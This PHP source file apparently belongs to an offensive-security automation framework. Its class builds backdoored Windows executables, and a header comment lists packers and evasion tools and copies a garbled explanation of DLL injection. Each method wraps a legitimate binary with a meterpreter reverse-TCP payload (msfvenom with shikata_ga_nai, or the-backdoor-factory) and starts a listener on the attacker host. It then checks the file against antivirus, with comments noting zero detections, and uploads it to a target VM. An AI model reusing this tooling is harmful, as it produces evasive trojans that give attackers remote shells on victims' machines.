<?php


/*
 Add : 
  - wrapper/Binders (bind into exe ) :
  msfvenom -> exec2vba.rb, exec2vbs.rb
  SET framework
  veil-evasion
  poison ivy
  
  
  Packers :
  UPX, Thinstall, PECompact, PEBundle, YODA 
  exec32pack
  themida 
  
  
  DCL injection requires
several steps to be taken by the attacker, including:
Allocating space in the victim process for the DLL code to occupy: Microsoft has included a built-in API in
Windows to accomplish this task, called “VirtualAllocEx.”
Allocating space in the victim process for the parameters required by the DLL to be injected: This step,
too, can be done using the built-in Windows VirtualAllocEx function call.
• Writing the name and code of the DEL into the memory space of the victim process: Again, Windows
includes an API with a function for doing this step, too. The WriteProcessMemory function call can be used to
write arbitrary data into the memory of a running process.
• Creating a thread in the victim process to actually run the newly injected DEL: As you might have guessed
by now, Windows includes an API with this capability, too. Microsoft has made this entire process much easier
with these various API calls. The CreateRemoteThread starts an execution thread in another process. which will
run any code alreath in that process, including a newly injected DLL.
• Freeing up resources in the victim process after execution is completed: If the attacker is extra polite, he or
she can even free up the resources consumed by this technique after the victim thread or process finishes
running, using the VirtualFreeEx function.
Overwriting API calls: This technique, called “API Flooking,” lets an attacker undermine any running process
in its interactions with Windows itself. By changing various calls associated with getting a list of running
processes, looking at open ports, viewing the registry, and interacting with the file system, the attacker can hide.
 */




class inject4win extends backdoor4win{
	var $source_bin ;

	public function __construct($target_vmx_name,$target_ip,$target_port,$attacker_ip,$attacker_port,$file_path_output,$snapshot,$bin) { // $target_dns,$host,$port,$file_path_output,$snapshot
	    parent::__construct($target_vmx_name,$target_ip,$target_port,$attacker_ip,$attacker_port,$file_path_output,$snapshot);
	    $this->source_bin = trim($bin);
	}
	
	
	
	

	public function backdoor_win_injected_into_app_32_no_forked() {
		$this->ssTitre(__FUNCTION__);
		$this->cmd($this->attacker_ip,"msfconsole -q -x \"use exploit/multi/handler;set RHOST $this->attacker_ip;set LPORT $this->attacker_port;run;\" ");
		$query = "msfvenom --payload  windows/meterpreter/reverse_tcp LHOST=$this->attacker_ip LPORT=$this->attacker_port -f exe -x $this->source_bin -e x86/shikata_ga_nai -i 1 --platform windows -a x86 -o $this->file_path";
		if (! file_exists($this->file_path )) {$this->requette($query);$this->requette("sudo chown $this->user2local:$this->user2local $this->file_path " );}
		else $this->cmd($this->attacker_ip,$query);
		$this->requette("du -b $this->source_bin $this->file_path");
		$this->file_file2virus2vt(); // 0 / 57
		$this->win2info();
		$vmx = new VM($this->target_vmx_name);$vmx->vm2upload($this->file_path, "$this->vm_tmp_win\\$this->file_ext");
		return $this;
	}
	
	
	public function backdoor_win_injected_into_app_32_forked() {
		$this->ssTitre(__FUNCTION__);
		$this->cmd($this->attacker_ip,"msfconsole -q -x \"use exploit/multi/handler;set RHOST $this->attacker_ip;set LPORT $this->attacker_port;run;\" ");
		$query = "msfvenom --payload  windows/meterpreter/reverse_tcp LHOST=$this->attacker_ip LPORT=$this->attacker_port -f exe -k -x $this->source_bin -e x86/shikata_ga_nai -i 1 --platform windows -a x86 -o $this->file_path";
		if (! file_exists($this->file_path )) {$this->requette($query);$this->requette("sudo chown $this->user2local:$this->user2local $this->file_path " );}
		else $this->cmd($this->attacker_ip,$query);
		$this->requette("du -b $this->source_bin $this->file_path");
		$this->file_file2virus2vt(); // 0 / 57
		$this->win2info();	
		$vmx = new VM($this->target_vmx_name);$vmx->vm2upload($this->file_path, "$this->vm_tmp_win\\$this->file_ext");
		return $this;
	}
	
	
	public function backdoor_win_injected_into_app_32_shellcode() {
		$this->ssTitre(__FUNCTION__);
		$this->cmd($this->attacker_ip,"msfvenom --payload  windows/exec -a x86 CMD='calc.exe' R > calc.bin");
		$this->cmd($this->attacker_ip,"python /opt/the-backdoor-factory/backdoor.py  -f psexec.exe -s user2supplied_shellcode -U calc.bin");
		$this->cmd($this->attacker_ip,"msfconsole -q -x \"use exploit/multi/handler;set RHOST $this->attacker_ip;set LPORT $this->attacker_port;run;\" ");
		$query = "python /opt/the-backdoor-factory/backdoor.py -v  -f $this->source_bin -F x86 -H $this->attacker_ip -P $this->attacker_port -s iat_reverse_tcp_inline -a --output-file=$this->file_ext ; cp ./backdoored/$this->file_ext $this->dir_tmp ; rm -vr ./backdoored";
		if (! file_exists($this->file_path )) {$this->requette($query);$this->requette("sudo chown $this->user2local:$this->user2local $this->file_path " );}
		else $this->cmd($this->attacker_ip,$query);
		$this->requette("du -b $this->source_bin $this->file_path");
		$this->file_file2virus2vt(); // 0 / 57
		$this->win2info();
		$vmx = new VM($this->target_vmx_name);$vmx->vm2upload($this->file_path, "$this->vm_tmp_win\\$this->file_ext");
		return $this;
	}
	
	
	
}